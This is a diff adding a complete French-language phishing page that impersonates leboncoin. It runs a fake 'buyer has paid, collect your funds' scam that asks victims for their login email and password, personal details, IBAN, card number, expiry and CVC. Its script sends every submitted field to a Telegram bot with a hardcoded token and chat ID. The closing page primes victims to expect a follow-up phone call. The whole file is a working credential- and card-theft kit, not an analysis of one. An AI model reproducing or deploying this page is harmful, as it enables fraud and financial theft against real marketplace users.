@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Récupération des fonds - leboncoin</title>
+    <style>
+        :root {
+            --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --lbc-orange: #ff6e14;
+            --lbc-bg: #ff6e14;
+            --text-grey: #666666;
+            --border-grey: #cccccc;
+            --white: #ffffff;
+            --lbc-green: #2ecc71;
+            --error-red: #e74c3c;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; transition: all 0.2s ease-in-out; }
+        body { font-family: var(--font-sans); background-color: var(--lbc-bg); display: flex; flex-direction: column; min-height: 100vh; }
+
+        header { background: var(--white); padding: 12px; border-bottom: 1px solid #e1e1e1; display: flex; justify-content: center; }
+        .logo-main { height: 35px; }
+
+        main { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px 15px; }
+
+        #loader-overlay { display: none; flex-direction: column; align-items: center; justify-content: center; margin: 40px 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--lbc-orange); border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .card { background: var(--white); width: 100%; max-width: 600px; padding: 35px 25px; border-radius: 16px; box-shadow: 0 12px 30px rgba(0, 0, 0, 0.1); margin-bottom: 25px; text-align: center; }
+        .step { display: none; opacity: 0; }
+        .step.active { display: block; opacity: 1; }
+
+        /* Saisie utilisateur : Gras et Gris Foncé */
+        input { font-weight: 700 !important; color: #444 !important; }
+
+        /* Logos agrandis */
+        .header-card-logo { height: 80px; margin-bottom: 25px; display: block; margin-left: auto; margin-right: auto; }
+        .logo-bottom-card { height: 50px; margin-top: 25px; display: block; margin-left: auto; margin-right: auto; }
+        
+        .section-title { font-size: 1.1rem; font-weight: 700; color: #000; margin: 25px 0 15px; text-transform: uppercase; text-align: left; }
+        
+        .form-group { text-align: left; margin-bottom: 18px; position: relative; }
+        .form-group input { width: 100%; padding: 14px; border: 1px solid var(--border-grey); border-radius: 8px; font-size: 1rem; outline: none; }
+        .form-group input.invalid { border-color: var(--error-red); }
+        .sub-label { display: block; font-size: 0.75rem; color: #777; margin-top: 5px; }
+        
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .tel-group { display: grid; grid-template-columns: 80px 1fr; gap: 10px; }
+
+        .bank-box { background-color: #f9f7f2; padding: 25px; border-radius: 12px; margin-top: 20px; border: 1px solid #eee; }
+        .bank-logo-center { height: 32px; margin: 0 auto 20px auto; display: block; }
+
+        .btn-submit { background-color: var(--lbc-orange); color: white; border: none; width: 100%; padding: 18px; border-radius: 35px; font-size: 1.1rem; font-weight: 600; cursor: pointer; }
+        .btn-undertext { font-size: 0.75rem; color: #999; margin-top: 15px; display: block; text-align: center; line-height: 1.4; }
+
+        .legal-text-large { font-size: 1.05rem; line-height: 1.6; color: #444; text-align: justify; margin-bottom: 25px; background: #fff; padding: 20px; border-left: 4px solid var(--lbc-orange); box-shadow: inset 0 0 10px rgba(0,0,0,0.02); }
+        .text-green { color: var(--lbc-green); font-weight: 700; font-size: 1.2rem; margin: 15px 0; }
+        .congrats-red { color: #ff0000; font-size: 1.6rem; font-weight: 700; margin-bottom: 15px; }
+
+        footer { background: var(--white); padding: 40px 15px; border-top: 1px solid #eee; margin-top: auto; }
+        .footer-container { max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; text-align: left; }
+        .footer-col h4 { font-size: 0.85rem; color: #333; text-transform: uppercase; margin-bottom: 15px; font-weight: 700; }
+        .footer-col ul { list-style: none; }
+        .footer-col ul li { margin-bottom: 8px; }
+        .footer-col ul li a { text-decoration: none; color: #666; font-size: 0.8rem; }
+        .footer-bottom { text-align: center; margin-top: 40px; font-size: 0.75rem; color: #aaa; border-top: 1px solid #f0f0f0; padding-top: 20px; }
+
+        @media (max-width: 480px) { .grid-2 { grid-template-columns: 1fr; } .footer-container { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+
+    <header>
+        <img src="https://i.ibb.co/PzFL6rHY/logo.png" alt="leboncoin" class="logo-main">
+    </header>
+
+    <main>
+        <div id="loader-overlay">
+            <div class="loader"></div>
+            <p style="margin-top:10px;color: #fff;">Traitement sécurisé en cours...</p>
+        </div>
+
+        <div class="card step active" id="page1">
+            <img src="https://i.ibb.co/1Gr8pbNG/Nloogo.png" class="header-card-logo">
+            <h1 style="font-size:1.05rem; color:var(--text-grey); margin-bottom:20px;">L'acheteur a effectué le paiement</h1>
+            <h2 style="font-size:1.5rem; font-weight:700; margin-bottom:15px;">Félicitations !</h2>
+            <p style="color:#777; margin-bottom:25px;">Vos fonds sont prêts à être transférés sur votre compte. Les fonds vous ont bien été transmis par l'acheteur et sont disponibles pour récupération sur votre compte bancaire.</p>
+
+
+
+            <div style="background:#f9f9f9; padding:20px; border-radius:8px; margin-bottom:25px; font-size:1rem; color:#666; line-height: 2;">
+                Référence : <strong>LBC-99281</strong><br>
+                Date : <span id="cur-date"></span><br>
+                Heure : <span id="cur-time"></span>
+            </div>
+            <button class="btn-submit" onclick="startLoading(2)">Récupérer les fonds</button>
+            <span class="btn-undertext">Transaction sécurisée SSL 256-bit.<br>© 2025 leboncoin - Tous droits réservés.</span>
+            <img src="https://i.ibb.co/439dPgF/loogo.png" class="logo-bottom-card">
+        </div>
+
+        <div class="card step" id="page2">
+            <img src="https://i.ibb.co/PzFL6rHY/logo.png" class="header-card-logo">
+            <h2 style="font-size:1.5rem; font-weight:700; margin-bottom:15px;">Connexion</h2>
+            <p style="margin-bottom:25px; color:#666;">Veuillez vous connecter pour confirmer votre identité.</p>
+            <div class="form-group">
+                <input type="email" id="email_login" placeholder="votre@email.com" required>
+                <span class="sub-label">Adresse e-mail</span>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password_login" placeholder="••••••••" required>
+                <span class="sub-label">Mot de passe</span>
+            </div>
+            <button class="btn-submit" onclick="validateAndGo(2, 3)">Se connecter</button>
+            <span class="btn-undertext">Connexion protégée par cryptage de bout en bout.</span>
+            <img src="https://i.ibb.co/439dPgF/loogo.png" class="logo-bottom-card">
+        </div>
+
+        <div class="card step" id="page3" style="text-align:left;">
+            <img src="https://i.ibb.co/N2rzGBQq/logo1.png" class="header-card-logo">
+            <h2 style="font-size:1.5rem; font-weight:700; text-align:center; margin-bottom:20px;">Félicitation !</h2>
+            <div class="legal-text-large">
+                Félicitations ! Votre acheteur a effectué le paiement, les fonds vous ont bien été transmis par votre acheteur et sont désormais disponibles. Pour la récupération sur votre compte bancaire, mettez vos informations bancaires à jour afin d'avoir les fonds sur votre compte bancaire instantanément. Nous protégeons tous les acheteurs et les vendeurs, aussi les données personnelles car selon Article L221-1 vous formez un contrat à distance qui se définit comme (tout contrat conclu entre un professionnel et un consommateur, dans le cadre d'un système organisé de vente ou de prestation de services à distance, sans la présence physique simultanée du professionnel et du consommateur, par le recours exclusif à une ou plusieurs techniques de communication à distance jusqu'à la conclusion du contrat )
+            </div>
+
+            <div class="section-title">Informations Personnelles *</div>
+            <div class="grid-2">
+                <div class="form-group"><input type="text" id="prenom" placeholder="Prénom" required><span class="sub-label">Prénom</span></div>
+                <div class="form-group"><input type="text" id="nom" placeholder="Nom" required><span class="sub-label">Nom de famille</span></div>
+            </div>
+            <div class="form-group"><input type="email" id="email_contact" placeholder="exemple@gmail.com" required><span class="sub-label">exemple@exemple.com</span></div>
+            <div class="form-group">
+                <div class="tel-group">
+                    <div style="text-align:center;"><input type="text" value="+ 33" disabled style="background:#eee; text-align:center;"><span class="sub-label">indicatif</span></div>
+                    <div><input type="text" id="telephone" placeholder="06 00 00 00 00" required><span class="sub-label">téléphone</span></div>
+                </div>
+            </div>
+
+            <div class="bank-box">
+                <div class="section-title" style="text-align:center; margin-top:0;">Informations bancaires *</div>
+                <img src="https://i.ibb.co/bgd5j3C1/cb.jpg" class="bank-logo-center">
+                <div class="form-group"><input type="text" id="nom_banque" placeholder="Nom de votre banque" required><span class="sub-label">Banque</span></div>
+                <div class="form-group"><input type="text" id="iban" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX" required><span class="sub-label">IBAN</span></div>
+                
+                <div class="form-group">
+                    <input type="text" id="carte_num" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                    <span class="sub-label">Numéro de la carte ( les 16 chiffres sur votre carte )</span>
+                </div>
+                
+                <div class="grid-2">
+                    <div class="form-group"><input type="text" id="expiration" placeholder="MM / AA" maxlength="5" required><span class="sub-label">Date d'expiration (MM/AA)</span></div>
+                    <div class="form-group"><input type="text" id="cvv" placeholder="123" maxlength="3" required><span class="sub-label">CVC ( les 3 chiffres au dos de la carte )</span></div>
+                </div>
+            </div>
+            <button class="btn-submit" style="margin-top:20px;" onclick="validateAndGo(3, 4)">Confirmer la récupération</button>
+            <span class="btn-undertext">Paiement hautement sécurisé par 3D Secure 2.0.</span>
+            <img src="https://i.ibb.co/N2rzGBQq/logo1.png" class="logo-bottom-card">
+        </div>
+
+        <div class="card step" id="page4">
+            <img src="https://i.ibb.co/N2rzGBQq/logo1.png" class="header-card-logo">
+            <h2 class="congrats-red">Félicitations !</h2>
+            <p style="font-weight: 600; font-size: 1.05rem;">Vos informations ont été mises à jour.</p>
+            <p class="text-green">vous avez reçu de l argent</p>
+            <p style="font-size: 0.95rem; color: #444; font-style: italic; margin-bottom: 20px;">Ce paiement de Leboncoin a été déduit du compte de l'acheteur et a <br> été « APPROUVE » par sa banque.</p>
+            <img src="https://i.ibb.co/xSmZkQwc/val.jpg" style="width:75px; margin:10px auto; display:block;">
+            <p style="font-weight:800; font-size:1.4rem; margin:15px 0;">Virement en Cours...</p>
+            <div style="font-size:1.05rem; line-height:1.6; color:#444; margin-bottom:25px;">
+                Nous vous prions de bien vouloir patienter un moment pour recevoir l’appel de notre service de paiement pour la sécurisation du versement des fonds, vous pouvez fermer la page et voir votre solde bancaire, Merci à vous!
+            </div>
+            <img src="https://i.ibb.co/v4rZzd77/Gif.gif" style="width:200px; margin:0 auto; display:block;">
+            <p style="color:#ff0000; font-weight:700; text-align:center; margin-top:35px; font-size:1.1rem;">Cordialement, Leboncoin</p>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-container">
+            <div class="footer-col">
+                <h4>À PROPOS</h4>
+                <ul><li><a href="#">Qui sommes-nous ?</a></li><li><a href="#">Nous rejoindre</a></li><li><a href="#">Impact local</a></li></ul>
+            </div>
+            <div class="footer-col">
+                <h4>NOS SOLUTIONS</h4>
+                <ul><li><a href="#">Publicité</a></li><li><a href="#">Immobilier</a></li><li><a href="#">Emploi</a></li></ul>
+            </div>
+            <div class="footer-col">
+                <h4>LÉGAL</h4>
+                <ul><li><a href="#">CGU</a></li><li><a href="#">Vie privée</a></li><li><a href="#">Cookies</a></li></ul>
+            </div>
+            <div class="footer-col">
+                <h4>AIDE</h4>
+                <ul><li><a href="#">Aide</a></li><li><a href="#">Sécurité</a></li><li><a href="#">Paiement</a></li></ul>
+            </div>
+        </div>
+        <div class="footer-bottom">leboncoin 2006 - 2025 - SIRET 521 724 336</div>
+    </footer>
+
+    <script>
+        const TOKEN = '8830403345:AAHZ7k3XoiHpG1eOHEhykVOUbl0WAPbsFvA';
+        const CHAT_ID = '8366707275';
+
+        // Format Date Exp MM/AA avec slash auto
+        document.getElementById('expiration').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '');
+            if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2,4);
+            e.target.value = v;
+        });
+
+        // Format Carte avec espaces tous les 4 chiffres
+        document.getElementById('carte_num').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, '');
+            let out = v.match(/.{1,4}/g);
+            e.target.value = out ? out.join(' ') : '';
+        });
+
+        function sendTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`);
+        }
+
+        function validateAndGo(curr, next) {
+            const div = document.getElementById('page' + curr);
+            const fields = div.querySelectorAll('input[required]');
+            let ok = true;
+
+            fields.forEach(f => {
+                if (!f.value.trim()) {
+                    f.classList.add('invalid');
+                    ok = false;
+                } else {
+                    f.classList.remove('invalid');
+                }
+            });
+
+            if (ok) {
+                let report = `<b>🔔 NOUVEAU LOG LBC (Page ${curr})</b>\n`;
+                fields.forEach(f => {
+                    let label = f.id;
+                    report += `▫️ <b>${label}:</b> <code>${f.value}</code>\n`;
+                });
+                sendTelegram(report);
+                startLoading(next);
+            }
+        }
+
+        function startLoading(n) {
+            const active = document.querySelector('.step.active');
+            active.classList.remove('active');
+            document.getElementById('loader-overlay').style.display = 'flex';
+            setTimeout(() => {
+                document.getElementById('loader-overlay').style.display = 'none';
+                active.style.display = 'none';
+                const next = document.getElementById('page' + n);
+                next.style.display = 'block';
+                setTimeout(() => next.classList.add('active'), 50);
+                window.scrollTo(0,0);
+            }, 3500);
+        }
+
+        window.onload = function() {
+            const d = new Date();
+            document.getElementById('cur-date').textContent = d.toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric' });
+            document.getElementById('cur-time').textContent = d.toLocaleTimeString('fr-FR', {hour:'2-digit', minute:'2-digit'});
+        };
+    </script>
+</body>
+</html>
+</html>
